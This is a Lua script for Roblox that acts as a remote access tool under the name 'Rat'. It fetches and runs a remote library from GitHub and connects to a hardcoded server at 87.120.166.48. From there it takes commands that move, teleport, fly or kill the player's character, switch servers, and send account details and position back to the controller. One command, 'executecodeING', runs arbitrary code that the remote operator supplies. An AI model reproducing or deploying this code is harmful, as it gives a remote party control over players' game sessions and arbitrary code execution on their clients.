local KasflowsClient = loadstring(game:HttpGet("https://raw.githubusercontent.com/KaSpEr-tv123/kasflowsjs/refs/heads/main/roblox/kasflows.lua"))()

local function sendChatMessage(text, color)
    local player = game.Players.LocalPlayer
    
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = text,
        Color = color or Color3.fromRGB(170, 0, 255),
        Font = Enum.Font.SourceSansBold,
        FontSize = Enum.FontSize.Size24
    })
end

local client = KasflowsClient.new('http://87.120.166.48:8000')

client:on("connect", function()
    client:sendToClient("Rat", "notification", {
        text = "Успешно подключенен аккаунт: " .. game.Players.LocalPlayer.Name,
        type = "success"
    })
end)

client:on("disconnect", function()
    client:sendToClient("Rat", "notification", {
        text = "Отключен от сервера",
        type = "error"
    })
end)

client:on("error", function(errorMessage)
    client:sendToClient("Rat", "notification", {
        text = "Ошибка: " .. errorMessage,
        type = "error"
    })
end)
client:on("action", function(message)
    if type(message) ~= "string" then
        return
    end
    
    local parts = {}
    for part in string.gmatch(message, "[^;]+") do
        table.insert(parts, part)
    end
    
    local command = parts[1]
    local arg = parts[2]
    
    local success, errorMsg = pcall(function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        if command == "runING" then
            local distance = arg and tonumber(arg) or 10
            local forwardDirection = humanoidRootPart.CFrame.LookVector
            local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
            tween:Play()
            
        elseif command == "runrightING" then
            local distance = arg and tonumber(arg) or 10
            local rightDirection = humanoidRootPart.CFrame.RightVector
            local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
            tween:Play()
            
        elseif command == "runleftING" then
            local distance = arg and tonumber(arg) or 10
            local leftDirection = -humanoidRootPart.CFrame.RightVector
            local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
            tween:Play()
            
        elseif command == "runbackING" then
            local distance = arg and tonumber(arg) or 10
            local backwardDirection = -humanoidRootPart.CFrame.LookVector
            local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
            tween:Play()
            
        elseif command == "jumpING" then
            humanoid.Jump = true
            
        elseif command == "teleportforwardING" then
            local distance = arg and tonumber(arg) or 10
            local forwardDirection = humanoidRootPart.CFrame.LookVector
            local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "teleportbackING" then
            local distance = arg and tonumber(arg) or 10
            local backwardDirection = -humanoidRootPart.CFrame.LookVector
            local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "teleportleftING" then
            local distance = arg and tonumber(arg) or 10
            local leftDirection = -humanoidRootPart.CFrame.RightVector
            local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "teleportrightING" then
            local distance = arg and tonumber(arg) or 10
            local rightDirection = humanoidRootPart.CFrame.RightVector
            local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "teleportupING" then
            local distance = arg and tonumber(arg) or 10
            local upDirection = Vector3.new(0, 1, 0)
            local targetPosition = humanoidRootPart.Position + (upDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "teleportdownING" then
            local distance = arg and tonumber(arg) or 10
            local downDirection = Vector3.new(0, -1, 0)
            local targetPosition = humanoidRootPart.Position + (downDirection * distance)
            
            humanoidRootPart.CFrame = CFrame.new(targetPosition)
            
        elseif command == "speedING" then
            local speedValue = arg and tonumber(arg) or 16 
            humanoid.WalkSpeed = speedValue
            
        elseif command == "jumppowerING" then
            local jumpValue = arg and tonumber(arg) or 50
            humanoid.JumpPower = jumpValue
            
        elseif command == "flyING" then
            local flying = humanoid:FindFirstChild("Flying")
            
            if flying then
                flying:Destroy()
            else
                local flyValue = Instance.new("BoolValue")
                flyValue.Name = "Flying"
                flyValue.Parent = humanoid
                
                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.Name = "FlyVelocity"
                bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bodyVelocity.Velocity = Vector3.new(0, 0, 0)
                bodyVelocity.Parent = humanoidRootPart
                
                local bodyGyro = Instance.new("BodyGyro")
                bodyGyro.Name = "FlyGyro"
                bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                bodyGyro.P = 10000
                bodyGyro.D = 100
                bodyGyro.CFrame = humanoidRootPart.CFrame
                bodyGyro.Parent = humanoidRootPart
                
                local function updateFlight()
                    if not flyValue or not flyValue.Parent then return end
                    
                    local lookVector = humanoidRootPart.CFrame.LookVector
                    local upVector = humanoidRootPart.CFrame.UpVector
                    local rightVector = humanoidRootPart.CFrame.RightVector
                    
                    local velocity = Vector3.new(0, 0, 0)
                    
                    local userInputService = game:GetService("UserInputService")
                    
                    if userInputService:IsKeyDown(Enum.KeyCode.W) then
                        velocity = velocity + lookVector
                    end
                    if userInputService:IsKeyDown(Enum.KeyCode.S) then
                        velocity = velocity - lookVector
                    end
                    if userInputService:IsKeyDown(Enum.KeyCode.A) then
                        velocity = velocity - rightVector
                    end
                    if userInputService:IsKeyDown(Enum.KeyCode.D) then
                        velocity = velocity + rightVector
                    end
                    if userInputService:IsKeyDown(Enum.KeyCode.Space) then
                        velocity = velocity + upVector
                    end
                    if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                        velocity = velocity - upVector
                    end
                    
                    if velocity.Magnitude > 0 then
                        velocity = velocity.Unit * humanoid.WalkSpeed
                    end
                    
                    local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
                    if flyVelocity then
                        flyVelocity.Velocity = velocity
                    end
                    
                    local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
                    if flyGyro then
                        flyGyro.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + lookVector)
                    end
                end
                
                spawn(function()
                    while flyValue and flyValue.Parent do
                        updateFlight()
                        wait(0.1)
                    end
                    
                    local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
                    if flyVelocity then
                        flyVelocity:Destroy()
                    end
                    
                    local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
                    if flyGyro then
                        flyGyro:Destroy()
                    end
                end)
            end
        elseif command == "turnleftING" then
            local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
            
            local currentCFrame = humanoidRootPart.CFrame
            local newCFrame = currentCFrame * CFrame.Angles(0, -angle, 0)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
            tween:Play()
            
        elseif command == "turnrightING" then
            local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
            
            local currentCFrame = humanoidRootPart.CFrame
            local newCFrame = currentCFrame * CFrame.Angles(0, angle, 0)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
            tween:Play()
            
        elseif command == "lookupING" then
            local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
            
            local currentCFrame = humanoidRootPart.CFrame
            local newCFrame = currentCFrame * CFrame.Angles(-angle, 0, 0)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
            tween:Play()
            
        elseif command == "lookdownING" then
            local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
            
            local currentCFrame = humanoidRootPart.CFrame
            local newCFrame = currentCFrame * CFrame.Angles(angle, 0, 0)
            
            local tweenService = game:GetService("TweenService")
            local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
            local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
            tween:Play()
            
        elseif command == "resetcameraING" then
            local position = humanoidRootPart.Position
            humanoidRootPart.CFrame = CFrame.new(position)
            
        elseif command == "getpositionING" then
            local position = humanoidRootPart.Position
            local x = math.floor(position.X * 10) / 10
            local y = math.floor(position.Y * 10) / 10
            local z = math.floor(position.Z * 10) / 10
            
        elseif command == "sitING" then
            humanoid.Sit = true
            
        elseif command == "danceING" then
            local function doDanceMove()
                local randomAngle = math.random(-45, 45)
                local verticalShift = math.rad(math.random(-15, 15))
                local hipShift = CFrame.new(0, math.random(-1,1)*0.3, 0)
                
                local currentCFrame = humanoidRootPart.CFrame
                local newCFrame = currentCFrame 
                    * CFrame.Angles(0, math.rad(randomAngle), verticalShift)
                    * hipShift
                
                local tweenService = game:GetService("TweenService")
                local tweenInfo = TweenInfo.new(
                    0.2 + math.random()*0.3,
                    Enum.EasingStyle.Quad,
                    Enum.EasingDirection.Out,
                    0,
                    false,
                    math.random(-2,2)*0.1
                )
                
                local tween = tweenService:Create(
                    humanoidRootPart, 
                    tweenInfo, 
                    {CFrame = newCFrame}
                )
                
                if math.random() > 0.7 then
                    humanoid.Jump = true
                end
                
                tween:Play()
                task.wait(0.1 + math.random()*0.3)
            end
            
            for i = 1, 40 do
                doDanceMove()
                wait(0.5)
            end
            
        elseif command == "waveING" then
            
        elseif command == "laughING" then
            
        elseif command == "resetING" then
            character:BreakJoints()
            
        elseif command == "executecodeING" then
            local code = arg
            if not code then
                return
            end
            
            local codeFunc, compileError = loadstring(code)
            if not codeFunc then
                return
            end
            
            local success, runtimeError = pcall(codeFunc)
            if not success then
                return
            end
            
        elseif command == "serverhopING" then
            local teleportService = game:GetService("TeleportService")
            local httpService = game:GetService("HttpService")
            local placeId = game.PlaceId
            
            local success, errorMsg = pcall(function()
                local servers = {}
                local cursor = ""
                local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
                
                repeat
                    local apiUrl = url
                    if cursor ~= "" then
                        apiUrl = url .. "&cursor=" .. cursor
                    end
                    
                    local response = httpService:JSONDecode(game:HttpGet(apiUrl))
                    cursor = response.nextPageCursor or ""
                    
                    for _, server in ipairs(response.data) do
                        if server.playing < server.maxPlayers and server.id ~= game.JobId then
                            table.insert(servers, server)
                        end
                    end
                until cursor == "" or #servers >= 5
                
                if #servers > 0 then
                    local selectedServer = servers[math.random(1, #servers)]
                    teleportService:TeleportToPlaceInstance(placeId, selectedServer.id, game.Players.LocalPlayer)
                end
            end)
            
        elseif command == "teleporttogameING" then
            local placeId = arg and tonumber(arg)
            if not placeId then
                return
            end
            
            local teleportService = game:GetService("TeleportService")
            local success, errorMsg = pcall(function()
                teleportService:Teleport(placeId, game.Players.LocalPlayer)
            end)
            
        elseif command == "joinplayerING" then
            local playerName = arg
            if not playerName or playerName == "" then
                return
            end
            gameid = game.PlaceId
            serverid = game.JobId
            client:sendToClient(playerName, "joinplayerbyinfo", {
                gameid = gameid,
                serverid = serverid
            })
            
        elseif command == "getplayerinfoING" then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
            
            local playerInfo = {
                ["Имя"] = player.Name,
                ["ID"] = player.UserId,
                ["Возраст аккаунта"] = player.AccountAge .. " дней",
                ["Здоровье"] = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth),
                ["Скорость"] = humanoid.WalkSpeed,
                ["Сила прыжка"] = humanoid.JumpPower,
                ["Текущая игра"] = game.PlaceId,
                ["Название игры"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
            }
            
            local position = character:WaitForChild("HumanoidRootPart").Position
            playerInfo["Позиция"] = "X: " .. math.floor(position.X*10)/10 .. ", Y: " .. math.floor(position.Y*10)/10 .. ", Z: " .. math.floor(position.Z*10)/10
            
            if success then
                client:sendToClient("Rat", "playerInfo", playerInfo)
                task.wait(5)
            end
            
        elseif command == "rejoinING" then
            local success, errorMsg = pcall(function()
                local teleportService = game:GetService("TeleportService")
                local placeId = game.PlaceId
                local jobId = game.JobId
                
                if jobId and jobId ~= "" then
                    teleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
                else
                    teleportService:Teleport(placeId, game.Players.LocalPlayer)
                end
            end)
            
        elseif command == "joinplayerbyidING" then
            local userId = arg and tonumber(arg)
            if not userId then
                return
            end
            
            local success, errorMsg = pcall(function()
                local username = ""
                pcall(function()
                    username = game.Players:GetNameFromUserIdAsync(userId)
                end)
                
                local teleportService = game:GetService("TeleportService")
                
                if teleportService.GameJoin then
                    teleportService:GameJoin(userId)
                elseif teleportService.TeleportToPrivateServer then
                    local httpService = game:GetService("HttpService")
                    local success, result = pcall(function()
                        local response = game:HttpGet("https://api.roblox.com/users/" .. userId .. "/onlinestatus")
                        return httpService:JSONDecode(response)
                    end)
                    
                    if success and result and result.PlaceId then
                        teleportService:Teleport(result.PlaceId)
                    else
                        teleportService:Teleport(game.PlaceId)
                    end
                else
                    teleportService:Teleport(game.PlaceId)
                end
            end)
        end
    end)
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при выполнении команды: " .. errorMsg,
            type = "error"
        })
    else
        client:sendToClient("Rat", "notification", {
            text = "Команда выполнена успешно",
            type = "success"
        })
    end
end)

client:on("joinplayerbyinfo", function(data)
    local gameid = data.gameid
    local serverid = data.serverid
    local teleportService = game:GetService("TeleportService")
    teleportService:TeleportToPlaceInstance(gameid, serverid, game.Players.LocalPlayer)
end)

local response = client:connect(game.Players.LocalPlayer.Name)

function getUserInfo(clientName)
    if not clientId then
        return
    end
    
    client:emit("action", "getplayerinfo")
end